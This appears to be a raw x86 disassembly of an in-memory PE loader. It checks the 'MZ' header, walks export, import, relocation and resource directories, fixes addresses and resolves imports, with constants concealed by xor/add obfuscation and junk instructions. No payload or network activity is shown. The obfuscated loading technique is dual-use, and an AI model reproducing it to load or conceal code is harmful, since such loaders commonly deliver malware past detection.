  4264b8:	jb     0x4264d9
  4264ba:	mov    esi,DWORD PTR [edx]
  4264bc:	mov    edi,DWORD PTR [edx]
  4264be:	mov    esi,DWORD PTR [esi+0x3c]
  4264c1:	lea    esi,[edi+esi*1+0x50]
  4264c5:	mov    edi,DWORD PTR [ecx]
  4264c7:	add    edi,DWORD PTR [esi]
  4264c9:	cmp    DWORD PTR [eax],edi
  4264cb:	jae    0x4264d9
  4264cd:	mov    esi,DWORD PTR [ecx]
  4264cf:	mov    ecx,DWORD PTR [eax]
  4264d1:	mov    edx,DWORD PTR [edx]
  4264d3:	sub    ecx,esi
  4264d5:	add    edx,ecx
  4264d7:	mov    DWORD PTR [eax],edx
  4264d9:	mov    eax,DWORD PTR [ebp+0xc]
  4264dc:	jmp    0x4264e0
  4264de:	xor    eax,eax
  4264e0:	pop    edi
  4264e1:	pop    esi
  4264e2:	pop    ebx
  4264e3:	leave  
  4264e4:	ret    0x1c
  4264e7:	push   ebp
  4264e8:	mov    ebp,esp
  4264ea:	sub    esp,0x1c
  4264ed:	push   esi
  4264ee:	mov    esi,eax
  4264f0:	mov    eax,DWORD PTR [ecx+0x190]
  4264f6:	cmp    DWORD PTR [eax],0x0
  4264f9:	je     0x426609
  4264ff:	test   edx,edx
  426501:	je     0x426609
  426507:	test   esi,esi
  426509:	je     0x426609
  42650f:	mov    eax,DWORD PTR [esi+0x88]
  426515:	test   eax,eax
  426517:	je     0x426604
  42651d:	cmp    DWORD PTR [esi+0x8c],0x10
  426524:	je     0x426604
  42652a:	cmp    DWORD PTR [esi+0x34],edx
  42652d:	je     0x426604
  426533:	mov    esi,DWORD PTR [ecx+0x18c]
  426539:	and    DWORD PTR [ebp-0x10],0x0
  42653d:	mov    ecx,edx
  42653f:	sub    ecx,DWORD PTR [esi]
  426541:	add    eax,edx
  426543:	movzx  edx,WORD PTR [eax+0xc]
  426547:	mov    DWORD PTR [ebp-0x1c],ecx
  42654a:	movzx  ecx,WORD PTR [eax+0xe]
  42654e:	add    ecx,edx
  426550:	je     0x426604
  426556:	lea    ecx,[eax+0x14]
  426559:	push   ebx
  42655a:	mov    DWORD PTR [ebp-0x18],ecx
  42655d:	mov    esi,0x7fffffff
  426562:	push   edi
  426563:	test   DWORD PTR [ecx],esi
  426565:	je     0x4265e6
  426567:	mov    edx,DWORD PTR [ecx]
  426569:	and    DWORD PTR [ebp-0xc],0x0
  42656d:	and    edx,esi
  42656f:	add    edx,eax
  426571:	movzx  edi,WORD PTR [edx+0xe]
  426575:	movzx  ebx,WORD PTR [edx+0xc]
  426579:	add    edi,ebx
  42657b:	je     0x4265e6
  42657d:	lea    ecx,[edx+0x14]
  426580:	mov    DWORD PTR [ebp-0x14],ecx
  426583:	test   DWORD PTR [ecx],esi
  426585:	je     0x4265c8
  426587:	mov    ecx,DWORD PTR [ecx]
  426589:	and    DWORD PTR [ebp-0x8],0x0
  42658d:	and    ecx,esi
  42658f:	add    ecx,eax
  426591:	movzx  edi,WORD PTR [ecx+0xe]
  426595:	movzx  ebx,WORD PTR [ecx+0xc]
  426599:	add    edi,ebx
  42659b:	je     0x4265c8
  42659d:	lea    edi,[ecx+0x14]
  4265a0:	mov    DWORD PTR [ebp-0x4],edi
  4265a3:	mov    edi,DWORD PTR [ebp-0x4]
  4265a6:	mov    edi,DWORD PTR [edi]
  4265a8:	test   edi,edi
  4265aa:	je     0x4265b2
  4265ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4265af:	add    DWORD PTR [edi+eax*1],ebx
  4265b2:	movzx  edi,WORD PTR [ecx+0xe]
  4265b6:	movzx  ebx,WORD PTR [ecx+0xc]
  4265ba:	inc    DWORD PTR [ebp-0x8]
  4265bd:	add    DWORD PTR [ebp-0x4],0x8
  4265c1:	add    edi,ebx
  4265c3:	cmp    DWORD PTR [ebp-0x8],edi
  4265c6:	jb     0x4265a3
  4265c8:	movzx  edi,WORD PTR [edx+0xe]
  4265cc:	movzx  ebx,WORD PTR [edx+0xc]
  4265d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4265d3:	inc    DWORD PTR [ebp-0xc]
  4265d6:	add    ecx,0x8
  4265d9:	add    edi,ebx
  4265db:	mov    DWORD PTR [ebp-0x14],ecx
  4265de:	cmp    DWORD PTR [ebp-0xc],edi
  4265e1:	jb     0x426583
  4265e3:	mov    ecx,DWORD PTR [ebp-0x18]
  4265e6:	movzx  edx,WORD PTR [eax+0xe]
  4265ea:	movzx  edi,WORD PTR [eax+0xc]
  4265ee:	inc    DWORD PTR [ebp-0x10]
  4265f1:	add    ecx,0x8
  4265f4:	add    edx,edi
  4265f6:	mov    DWORD PTR [ebp-0x18],ecx
  4265f9:	cmp    DWORD PTR [ebp-0x10],edx
  4265fc:	jb     0x426563
  426602:	pop    edi
  426603:	pop    ebx
  426604:	xor    eax,eax
  426606:	inc    eax
  426607:	jmp    0x42660b
  426609:	xor    eax,eax
  42660b:	pop    esi
  42660c:	leave  
  42660d:	ret    
  42660e:	push   ebp
  42660f:	mov    ebp,esp
  426611:	mov    ecx,DWORD PTR [ecx+0x190]
  426617:	mov    eax,DWORD PTR [ebp+0xc]
  42661a:	sub    esp,0x10
  42661d:	push   ebx
  42661e:	xor    ebx,ebx
  426620:	push   esi
  426621:	push   edi
  426622:	cmp    DWORD PTR [ecx],ebx
  426624:	je     0x4266ac
  42662a:	cmp    eax,ebx
  42662c:	je     0x4266ac
  42662e:	cmp    DWORD PTR [eax+0x78],ebx
  426631:	jne    0x426638
  426633:	xor    eax,eax
  426635:	inc    eax
  426636:	jmp    0x4266ae
  426638:	mov    eax,DWORD PTR [eax+0x78]
  42663b:	add    eax,DWORD PTR [ebp+0x8]
  42663e:	mov    ecx,DWORD PTR [eax+0x1c]
  426641:	mov    edx,DWORD PTR [eax+0x24]
  426644:	mov    esi,DWORD PTR [eax+0x14]
  426647:	mov    edi,DWORD PTR [eax+0x18]
  42664a:	add    ecx,DWORD PTR [ebp+0x8]
  42664d:	add    edx,DWORD PTR [ebp+0x8]
  426650:	mov    DWORD PTR [ebp-0x4],esi
  426653:	cmp    esi,edi
  426655:	ja     0x42665a
  426657:	mov    DWORD PTR [ebp-0x4],edi
  42665a:	mov    DWORD PTR [ebp-0x8],ebx
  42665d:	cmp    DWORD PTR [ebp-0x4],ebx
  426660:	jbe    0x426633
  426662:	cmp    ebx,DWORD PTR [eax+0x14]
  426665:	jae    0x42666d
  426667:	movzx  esi,WORD PTR [edx+ebx*2]
  42666b:	jmp    0x42666f
  42666d:	mov    esi,ebx
  42666f:	lea    esi,[ecx+esi*4]
  426672:	mov    edi,DWORD PTR [esi]
  426674:	test   edi,edi
  426676:	je     0x4266a1
  426678:	add    edi,DWORD PTR [ebp+0x8]
  42667b:	mov    DWORD PTR [ebp-0x10],edi
  42667e:	cmp    edi,eax
  426680:	jbe    0x426692
  426682:	mov    ebx,DWORD PTR [ebp+0xc]
  426685:	mov    ebx,DWORD PTR [ebx+0x7c]
  426688:	add    ebx,eax
  42668a:	cmp    edi,ebx
  42668c:	jae    0x426692
  42668e:	mov    esi,DWORD PTR [esi]
  426690:	jmp    0x42669a
  426692:	sub    edi,DWORD PTR [ebp+0x8]
  426695:	mov    DWORD PTR [esi],edi
  426697:	mov    esi,DWORD PTR [ebp-0x10]
  42669a:	test   esi,esi
  42669c:	je     0x4266ac
  42669e:	mov    ebx,DWORD PTR [ebp-0x8]
  4266a1:	inc    ebx
  4266a2:	mov    DWORD PTR [ebp-0x8],ebx
  4266a5:	cmp    ebx,DWORD PTR [ebp-0x4]
  4266a8:	jb     0x426662
  4266aa:	jmp    0x426633
  4266ac:	xor    eax,eax
  4266ae:	pop    edi
  4266af:	pop    esi
  4266b0:	pop    ebx
  4266b1:	leave  
  4266b2:	ret    0x8
  4266b5:	push   ebp
  4266b6:	mov    ebp,esp
  4266b8:	sub    esp,0x2c
  4266bb:	mov    edx,0xf89c85b0
  4266c0:	mov    DWORD PTR [ebp-0x4],edx
  4266c3:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4266ca:	mov    eax,DWORD PTR [ebp-0x4]
  4266cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4266d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4266d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4266d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4266d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4266dc:	push   ebx
  4266dd:	mov    ebx,DWORD PTR [ebp+0x10]
  4266e0:	push   esi
  4266e1:	mov    esi,0x75108a4
  4266e6:	mov    DWORD PTR [ebp-0x10],0x352eb2e
  4266ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4266f0:	mov    ebx,DWORD PTR [ebx+0x190]
  4266f6:	push   edi
  4266f7:	mov    edi,0x3272ec
  4266fc:	xor    ecx,esi
  4266fe:	xor    eax,esi
  426700:	add    eax,edi
  426702:	add    ecx,edi
  426704:	mov    DWORD PTR [ebp-0x18],eax
  426707:	cmp    ecx,DWORD PTR [ebx]
  426709:	je     0x42698a
  42670f:	mov    ebx,DWORD PTR [ebp-0x4]
  426712:	mov    ecx,DWORD PTR [ebp+0xc]
  426715:	xor    ebx,esi
  426717:	add    ebx,edi
  426719:	cmp    ebx,ecx
  42671b:	je     0x42698a
  426721:	mov    ebx,DWORD PTR [ebp-0x4]
  426724:	mov    ecx,DWORD PTR [ecx+0x80]
  42672a:	xor    ebx,esi
  42672c:	add    ebx,edi
  42672e:	cmp    ecx,ebx
  426730:	je     0x426985
  426736:	add    ecx,DWORD PTR [ebp+0x8]
  426739:	mov    DWORD PTR [ebp-0x2c],ecx
  42673c:	mov    ebx,edx
  42673e:	xor    ebx,esi
  426740:	add    ebx,edi
  426742:	mov    DWORD PTR [ebp-0x10],ebx
  426745:	mov    ebx,DWORD PTR [ebp-0x10]
  426748:	cmp    ebx,edx
  42674a:	je     0x42675e
  42674c:	mov    edx,DWORD PTR [ebp-0x10]
  42674f:	mov    ebx,DWORD PTR [ebp-0x4]
  426752:	imul   edx,edx,0x14
  426755:	xor    ebx,esi
  426757:	add    ebx,edi
  426759:	cmp    DWORD PTR [edx+ecx*1],ebx
  42675c:	jne    0x426775
  42675e:	mov    edx,DWORD PTR [ebp-0x10]
  426761:	mov    ebx,DWORD PTR [ebp-0x4]
  426764:	imul   edx,edx,0x14
  426767:	xor    ebx,esi
  426769:	add    ebx,edi
  42676b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  42676f:	je     0x426977
  426775:	mov    eax,DWORD PTR [ebp-0x4]
  426778:	mov    ebx,DWORD PTR [ebp-0x4]
  42677b:	mov    eax,DWORD PTR [ebp-0x10]
  42677e:	imul   eax,eax,0x14
  426781:	add    eax,ecx
  426783:	mov    ecx,DWORD PTR [eax+0x10]
  426786:	add    ecx,DWORD PTR [ebp+0x8]
  426789:	xor    ebx,esi
  42678b:	mov    DWORD PTR [ebp-0x1c],ecx
  42678e:	mov    ecx,DWORD PTR [ebp-0x4]
  426791:	mov    edx,DWORD PTR [ebp-0x4]
  426794:	xor    ecx,esi
  426796:	add    ecx,edi
  426798:	xor    edx,esi
  42679a:	mov    DWORD PTR [ebp-0x24],ecx
  42679d:	mov    ecx,DWORD PTR [eax]
  42679f:	add    edx,edi
  4267a1:	add    ebx,edi
  4267a3:	cmp    ecx,edx
  4267a5:	je     0x4267ad
  4267a7:	add    ecx,DWORD PTR [ebp+0x8]
  4267aa:	mov    DWORD PTR [ebp-0x24],ecx
  4267ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4267b0:	xor    ecx,esi
  4267b2:	add    ecx,DWORD PTR [eax+0xc]
  4267b5:	mov    eax,DWORD PTR [ebp+0x8]
  4267b8:	lea    eax,[ecx+eax*1+0x3272ec]
  4267bf:	mov    DWORD PTR [ebp+0xc],eax
  4267c2:	mov    DWORD PTR [ebp-0x28],0xf89c85bd
  4267c9:	mov    eax,DWORD PTR [ebp+0x10]
  4267cc:	push   DWORD PTR [ebp+0xc]
  4267cf:	mov    eax,DWORD PTR [eax+0x1d8]
  4267d5:	call   DWORD PTR [eax]
  4267d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4267da:	xor    ecx,esi
  4267dc:	add    ecx,edi
  4267de:	mov    DWORD PTR [ebp-0xc],eax
  4267e1:	cmp    ecx,eax
  4267e3:	jne    0x4267f7
  4267e5:	mov    eax,DWORD PTR [ebp+0x10]
  4267e8:	push   DWORD PTR [ebp+0xc]
  4267eb:	mov    eax,DWORD PTR [eax+0x1d8]
  4267f1:	call   DWORD PTR [eax+0xc]
  4267f4:	mov    DWORD PTR [ebp-0xc],eax
  4267f7:	mov    DWORD PTR [ebp-0x20],0x7f661b29
  4267fe:	mov    DWORD PTR [ebp-0x20],0xf89c9859
  426805:	mov    eax,DWORD PTR [ebp-0x4]
  426808:	xor    eax,esi
  42680a:	add    eax,edi
  42680c:	cmp    eax,DWORD PTR [ebp-0xc]
  42680f:	jne    0x426834
  426811:	mov    eax,DWORD PTR [ebp-0x8]
  426814:	mov    ecx,DWORD PTR [ebp-0x20]
  426817:	xor    eax,esi
  426819:	xor    ecx,esi
  42681b:	lea    ebx,[ebx+eax*1+0x3272ec]
  426822:	mov    eax,DWORD PTR [ebp+0x10]
  426825:	mov    eax,DWORD PTR [eax+0x1d8]
  42682b:	add    ecx,edi
  42682d:	imul   ecx,ebx
  426830:	push   ecx
  426831:	call   DWORD PTR [eax+0x24]
  426834:	mov    eax,DWORD PTR [ebp-0x4]
  426837:	xor    eax,esi
  426839:	add    eax,edi
  42683b:	cmp    eax,DWORD PTR [ebp-0xc]
  42683e:	jne    0x42684f
  426840:	mov    eax,DWORD PTR [ebp-0x28]
  426843:	xor    eax,esi
  426845:	add    eax,edi
  426847:	cmp    ebx,eax
  426849:	jbe    0x4267c9
  42684f:	mov    eax,DWORD PTR [ebp-0x4]
  426852:	xor    eax,esi
  426854:	add    eax,edi
  426856:	cmp    eax,DWORD PTR [ebp-0xc]
  426859:	jne    0x426872
  42685b:	mov    eax,DWORD PTR [ebp-0x8]
  42685e:	mov    ecx,DWORD PTR [ebp-0x18]
  426861:	xor    eax,esi
  426863:	lea    eax,[ecx+eax*1+0x3272ec]
  42686a:	mov    DWORD PTR [ebp-0x18],eax
  42686d:	jmp    0x426961
  426872:	mov    DWORD PTR [ebp-0x14],0x1121b28
  426879:	mov    DWORD PTR [ebp+0xc],0xe042d2e
  426880:	mov    ebx,DWORD PTR [ebp-0x4]
  426883:	xor    ebx,esi
  426885:	add    ebx,edi
  426887:	jmp    0x42694e
  42688c:	mov    eax,DWORD PTR [ebp-0x4]
  42688f:	xor    eax,esi
  426891:	add    eax,edi
  426893:	mov    DWORD PTR [ebp-0x14],eax
  426896:	mov    eax,DWORD PTR [ebp-0x4]
  426899:	xor    eax,esi
  42689b:	add    eax,edi
  42689d:	mov    DWORD PTR [ebp+0xc],eax
  4268a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268a3:	mov    eax,DWORD PTR [ebp-0x24]
  4268a6:	xor    ecx,esi
  4268a8:	add    ecx,edi
  4268aa:	cmp    ecx,eax
  4268ac:	je     0x4268b4
  4268ae:	mov    eax,DWORD PTR [eax+ebx*4]
  4268b1:	mov    DWORD PTR [ebp-0x14],eax
  4268b4:	mov    eax,DWORD PTR [ebp-0x1c]
  4268b7:	mov    eax,DWORD PTR [eax+ebx*4]
  4268ba:	mov    DWORD PTR [ebp+0xc],eax
  4268bd:	mov    eax,DWORD PTR [ebp-0x4]
  4268c0:	mov    ecx,DWORD PTR [ebp-0x14]
  4268c3:	xor    eax,esi
  4268c5:	add    eax,edi
  4268c7:	cmp    eax,ecx
  4268c9:	je     0x4268f4
  4268cb:	mov    eax,DWORD PTR [ebp-0x4]
  4268ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4268d1:	xor    eax,esi
  4268d3:	add    eax,edi
  4268d5:	shr    ecx,0x1f
  4268d8:	cmp    eax,ecx
  4268da:	je     0x4268f4
  4268dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4268df:	mov    eax,DWORD PTR [ebp+0x10]
  4268e2:	mov    eax,DWORD PTR [eax+0x1d8]
  4268e8:	movzx  ecx,cx
  4268eb:	push   ecx
  4268ec:	push   DWORD PTR [ebp-0xc]
  4268ef:	call   DWORD PTR [eax+0x8]
  4268f2:	jmp    0x42690d
  4268f4:	mov    eax,DWORD PTR [ebp+0xc]
  4268f7:	add    eax,DWORD PTR [ebp+0x8]
  4268fa:	mov    ecx,DWORD PTR [ebp+0x10]
  4268fd:	mov    ecx,DWORD PTR [ecx+0x1d8]
  426903:	add    eax,0x2
  426906:	push   eax
  426907:	push   DWORD PTR [ebp-0xc]
  42690a:	call   DWORD PTR [ecx+0x8]
  42690d:	mov    DWORD PTR [ebp+0xc],eax
  426910:	mov    eax,DWORD PTR [ebp-0x4]
  426913:	mov    ecx,DWORD PTR [ebp+0xc]
  426916:	xor    eax,esi
  426918:	add    eax,edi
  42691a:	cmp    eax,ecx
  42691c:	mov    eax,DWORD PTR [ebp-0x8]
  42691f:	jne    0x426932
  426921:	mov    ecx,DWORD PTR [ebp-0x18]
  426924:	xor    eax,esi
  426926:	lea    eax,[ecx+eax*1+0x3272ec]
  42692d:	mov    DWORD PTR [ebp-0x18],eax
  426930:	jmp    0x426942
  426932:	mov    ecx,DWORD PTR [ebp+0xc]
  426935:	xor    eax,esi
  426937:	add    eax,edi
  426939:	imul   eax,ecx
  42693c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42693f:	mov    DWORD PTR [ecx+ebx*4],eax
  426942:	mov    eax,DWORD PTR [ebp-0x8]
  426945:	xor    eax,esi
  426947:	lea    ebx,[ebx+eax*1+0x3272ec]
  42694e:	mov    eax,DWORD PTR [ebp-0x4]
  426951:	mov    ecx,DWORD PTR [ebp-0x1c]
  426954:	xor    eax,esi
  426956:	add    eax,edi
  426958:	cmp    DWORD PTR [ecx+ebx*4],eax
  42695b:	jne    0x42688c
  426961:	mov    edx,DWORD PTR [ebp-0x10]
  426964:	mov    ecx,DWORD PTR [ebp-0x2c]
  426967:	mov    eax,DWORD PTR [ebp-0x18]
  42696a:	sub    edx,0x3272eb
  426970:	xor    edx,esi
  426972:	jmp    0x42673c
  426977:	mov    ecx,DWORD PTR [ebp-0x4]
  42697a:	xor    ecx,esi
  42697c:	add    ecx,edi
  42697e:	cmp    eax,ecx
  426980:	mov    eax,DWORD PTR [ebp-0x4]
  426983:	jne    0x42698d
  426985:	mov    eax,DWORD PTR [ebp-0x8]
  426988:	jmp    0x42698d
  42698a:	mov    eax,DWORD PTR [ebp-0x4]
  42698d:	xor    eax,esi
  42698f:	add    eax,edi
  426991:	pop    edi
  426992:	pop    esi
  426993:	pop    ebx
  426994:	leave  
  426995:	ret    0xc
  426998:	push   ebp
  426999:	mov    ebp,esp
  42699b:	sub    esp,0x28
  42699e:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4269a5:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  4269ac:	mov    eax,DWORD PTR [ebp+0xc]
  4269af:	mov    DWORD PTR [ebp+0xc],eax
  4269b2:	push   esi
  4269b3:	mov    eax,eax
  4269b5:	mov    eax,DWORD PTR [ebp-0x4]
  4269b8:	mov    esi,DWORD PTR [ebp+0x8]
  4269bb:	mov    ecx,0x75108a4
  4269c0:	xor    eax,ecx
  4269c2:	mov    edx,0x3272ec
  4269c7:	add    eax,edx
  4269c9:	cmp    esi,eax
  4269cb:	je     0x426af2
  4269d1:	mov    eax,DWORD PTR [ebp+0x8]
  4269d4:	mov    esi,DWORD PTR [ebp+0x8]
  4269d7:	add    esi,DWORD PTR [eax+0x3c]
  4269da:	push   edi
  4269db:	mov    DWORD PTR [ebp+0xc],esi
  4269de:	mov    DWORD PTR [ebp-0x1c],0xf89c85bd
  4269e5:	mov    eax,DWORD PTR [ebp-0x1c]
  4269e8:	mov    esi,DWORD PTR [ebp-0x4]
  4269eb:	mov    edi,DWORD PTR [ebp+0xc]
  4269ee:	xor    esi,ecx
  4269f0:	xor    eax,ecx
  4269f2:	add    esi,edx
  4269f4:	cmp    DWORD PTR [edi+eax*8+0x19397d8],esi
  4269fb:	je     0x426aec
  426a01:	mov    esi,DWORD PTR [ebp+0xc]
  426a04:	mov    eax,DWORD PTR [ebp+0x8]
  426a07:	add    eax,DWORD PTR [esi+0xa0]
  426a0d:	mov    esi,DWORD PTR [ebp+0x8]
  426a10:	mov    edi,DWORD PTR [ebp+0xc]
  426a13:	sub    esi,DWORD PTR [edi+0x34]
  426a16:	mov    edi,DWORD PTR [ebp-0x4]
  426a19:	xor    edi,ecx
  426a1b:	add    edi,edx
  426a1d:	mov    DWORD PTR [ebp-0x24],esi
  426a20:	cmp    esi,edi
  426a22:	je     0x426aec
  426a28:	mov    esi,DWORD PTR [ebp-0x4]
  426a2b:	xor    esi,ecx
  426a2d:	add    esi,edx
  426a2f:	mov    DWORD PTR [ebp-0x8],esi
  426a32:	push   ebx
  426a33:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  426a3a:	jmp    0x426ad6
  426a3f:	mov    esi,DWORD PTR [ebp-0x4]
  426a42:	xor    esi,ecx
  426a44:	lea    edi,[ebx-0x8]
  426a47:	add    esi,edx
  426a49:	shr    edi,1
  426a4b:	cmp    esi,edi
  426a4d:	jae    0x426abc
  426a4f:	sub    edi,esi
  426a51:	lea    ebx,[eax+esi*2+0x8]
  426a55:	mov    DWORD PTR [ebp-0x18],edi
  426a58:	movzx  esi,WORD PTR [ebx]
  426a5b:	and    esi,0xfff
  426a61:	mov    DWORD PTR [ebp-0x14],esi
  426a64:	mov    edi,DWORD PTR [ebp-0x14]
  426a67:	mov    esi,DWORD PTR [eax]
  426a69:	sub    esi,edx
  426a6b:	add    edi,esi
  426a6d:	movzx  esi,WORD PTR [ebx]
  426a70:	shr    esi,0xc
  426a73:	xor    edi,ecx
  426a75:	mov    DWORD PTR [ebp-0x20],edi
  426a78:	mov    DWORD PTR [ebp-0x14],esi
  426a7b:	mov    esi,DWORD PTR [ebp-0x20]
  426a7e:	mov    edi,DWORD PTR [ebp+0x8]
  426a81:	xor    esi,ecx
  426a83:	lea    esi,[esi+edi*1+0x3272ec]
  426a8a:	mov    DWORD PTR [ebp-0x20],esi
  426a8d:	mov    esi,DWORD PTR [ebp-0x10]
  426a90:	mov    edi,DWORD PTR [ebp-0x14]
  426a93:	xor    esi,ecx
  426a95:	add    esi,edx
  426a97:	cmp    edi,esi
  426a99:	jne    0x426ab1
  426a9b:	mov    esi,DWORD PTR [ebp-0x10]
  426a9e:	mov    edi,DWORD PTR [ebp-0x14]
  426aa1:	xor    esi,ecx
  426aa3:	add    esi,edx
  426aa5:	cmp    edi,esi
  426aa7:	jne    0x426ab1
  426aa9:	mov    esi,DWORD PTR [ebp-0x20]
  426aac:	mov    edi,DWORD PTR [ebp-0x24]
  426aaf:	add    DWORD PTR [esi],edi
  426ab1:	add    ebx,0x2
  426ab4:	dec    DWORD PTR [ebp-0x18]
  426ab7:	jne    0x426a58
  426ab9:	mov    ebx,DWORD PTR [ebp-0xc]
  426abc:	add    DWORD PTR [ebp-0x8],ebx
  426abf:	mov    esi,DWORD PTR [ebp-0x1c]
  426ac2:	mov    edi,DWORD PTR [ebp-0x8]
  426ac5:	mov    ebx,DWORD PTR [ebp+0xc]
  426ac8:	xor    esi,ecx
  426aca:	cmp    edi,DWORD PTR [ebx+esi*8+0x19397dc]
  426ad1:	jae    0x426aeb
  426ad3:	add    eax,DWORD PTR [ebp-0xc]
  426ad6:	mov    esi,DWORD PTR [ebp-0x4]
  426ad9:	mov    ebx,DWORD PTR [eax+0x4]
  426adc:	xor    esi,ecx
  426ade:	add    esi,edx
  426ae0:	mov    DWORD PTR [ebp-0xc],ebx
  426ae3:	cmp    ebx,esi
  426ae5:	jne    0x426a3f
  426aeb:	pop    ebx
  426aec:	mov    eax,DWORD PTR [ebp-0x28]
  426aef:	pop    edi
  426af0:	jmp    0x426af5
  426af2:	mov    eax,DWORD PTR [ebp-0x4]
  426af5:	xor    eax,ecx
  426af7:	add    eax,edx
  426af9:	pop    esi
  426afa:	leave  
  426afb:	ret    0x8
  426afe:	push   ebp
  426aff:	mov    ebp,esp
  426b01:	sub    esp,0xd8
  426b07:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  426b0e:	mov    DWORD PTR [ebp-0x24],0xf89c85b1
  426b15:	mov    eax,DWORD PTR [ebp-0x4]
  426b18:	push   ebx
  426b19:	push   esi
  426b1a:	mov    esi,0x75108a4
  426b1f:	xor    eax,esi
  426b21:	push   edi
  426b22:	mov    edi,0x3272ec
  426b27:	add    eax,edi
  426b29:	mov    DWORD PTR [ebp-0x18],eax
  426b2c:	mov    eax,DWORD PTR [ebp-0x4]
  426b2f:	xor    eax,esi
  426b31:	add    eax,edi
  426b33:	mov    DWORD PTR [ebp-0x8],eax
  426b36:	mov    ebx,DWORD PTR [ebp+0x20]
  426b39:	mov    eax,DWORD PTR [ebp-0x1c]
  426b3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426b3f:	xor    eax,ecx
  426b41:	mov    DWORD PTR [ebp-0x1c],eax
  426b44:	add    DWORD PTR [ebp-0x1c],0xf89cb5b0
  426b4b:	mov    eax,DWORD PTR [ebp-0xc]
  426b4e:	mov    ecx,DWORD PTR [ebp-0xc]
  426b51:	xor    eax,ecx
  426b53:	mov    DWORD PTR [ebp-0xc],eax
  426b56:	add    DWORD PTR [ebp-0xc],0xf89c85f0
  426b5d:	mov    eax,DWORD PTR [ebp-0x10]
  426b60:	mov    ecx,DWORD PTR [ebp-0x10]
  426b63:	xor    eax,ecx
  426b65:	mov    DWORD PTR [ebp-0x10],eax
  426b68:	add    DWORD PTR [ebp-0x10],0xf89c85bc
  426b6f:	mov    eax,DWORD PTR [ebp-0x28]
  426b72:	mov    ecx,DWORD PTR [ebp-0x28]
  426b75:	xor    eax,ecx
  426b77:	mov    DWORD PTR [ebp-0x28],eax
  426b7a:	add    DWORD PTR [ebp-0x28],0xf89f05b0
  426b81:	mov    DWORD PTR [ebp+0x20],0xf89cefc5
  426b88:	mov    eax,DWORD PTR [ebp+0x8]
  426b8b:	test   eax,eax
  426b8d:	je     0x427018
  426b93:	mov    eax,DWORD PTR [ebp+0xc]
  426b96:	test   eax,eax
  426b98:	je     0x427018
  426b9e:	mov    eax,DWORD PTR [ebp+0x18]
  426ba1:	test   eax,eax
  426ba3:	je     0x427018
  426ba9:	mov    eax,DWORD PTR [ebp+0x20]
  426bac:	mov    ecx,DWORD PTR [ebp+0x8]
  426baf:	xor    eax,0x8a4
  426bb4:	add    eax,0x72ec
  426bb9:	cmp    WORD PTR [ecx],ax
  426bbc:	jne    0x427018
  426bc2:	mov    eax,DWORD PTR [ebp-0x4]
  426bc5:	xor    eax,esi
  426bc7:	add    eax,edi
  426bc9:	mov    DWORD PTR [ebp-0x30],eax
  426bcc:	mov    eax,DWORD PTR [ebp-0x4]
  426bcf:	mov    ecx,DWORD PTR [ebp+0x8]
  426bd2:	mov    eax,DWORD PTR [ebp+0x8]
  426bd5:	add    eax,DWORD PTR [ecx+0x3c]
  426bd8:	mov    DWORD PTR [ebp+0xc],eax
  426bdb:	mov    eax,DWORD PTR [eax+0x50]
  426bde:	test   eax,eax
  426be0:	je     0x427018
  426be6:	mov    DWORD PTR [ebp-0x2c],0xf88c85b0
  426bed:	mov    eax,DWORD PTR [ebp-0x2c]
  426bf0:	xor    eax,esi
  426bf2:	add    eax,edi
  426bf4:	mov    DWORD PTR [ebp-0x2c],eax
  426bf7:	mov    eax,DWORD PTR [ebp-0x4]
  426bfa:	mov    eax,DWORD PTR [ebx+0x190]
  426c00:	mov    ecx,DWORD PTR [eax]
  426c02:	mov    ecx,DWORD PTR [ecx+0x3c]
  426c05:	add    ecx,DWORD PTR [eax]
  426c07:	mov    eax,DWORD PTR [ebp-0x4]
  426c0a:	mov    eax,DWORD PTR [ebx+0x18c]
  426c10:	mov    edx,DWORD PTR [eax]
  426c12:	mov    DWORD PTR [ebp-0x20],ecx
  426c15:	mov    DWORD PTR [ebp+0x20],edx
  426c18:	cmp    edx,edx
  426c1a:	jne    0x426c4e
  426c1c:	mov    eax,DWORD PTR [ebx+0x1d8]
  426c22:	lea    edx,[ebp-0x18]
  426c25:	push   edx
  426c26:	mov    edx,DWORD PTR [ebp-0xc]
  426c29:	xor    edx,esi
  426c2b:	add    edx,edi
  426c2d:	push   edx
  426c2e:	push   DWORD PTR [ecx+0x50]
  426c31:	push   DWORD PTR [ebp+0x20]
  426c34:	call   DWORD PTR [eax+0x1c]
  426c37:	mov    eax,DWORD PTR [ebp-0x20]
  426c3a:	mov    ecx,DWORD PTR [eax+0x54]
  426c3d:	mov    eax,DWORD PTR [eax+0x50]
  426c40:	sub    eax,ecx
  426c42:	add    ecx,DWORD PTR [ebp+0x20]
  426c45:	push   ecx
  426c46:	call   0x4275b5
  426c4b:	mov    edx,DWORD PTR [ebp+0x20]
  426c4e:	mov    eax,DWORD PTR [ebx+0x194]
  426c54:	mov    DWORD PTR [eax],edx
  426c56:	mov    eax,DWORD PTR [ebp+0xc]
  426c59:	push   DWORD PTR [eax+0x54]
  426c5c:	push   DWORD PTR [ebp+0x8]
  426c5f:	push   edx
  426c60:	call   0x4274ab
  426c65:	mov    ecx,DWORD PTR [ebp+0x20]
  426c68:	mov    eax,DWORD PTR [ecx+0x3c]
  426c6b:	add    eax,ecx
  426c6d:	movzx  ecx,WORD PTR [eax+0x14]
  426c71:	lea    ecx,[ecx+eax*1+0x18]
  426c75:	mov    DWORD PTR [ebp+0x18],ecx
  426c78:	mov    ecx,DWORD PTR [ebp-0x4]
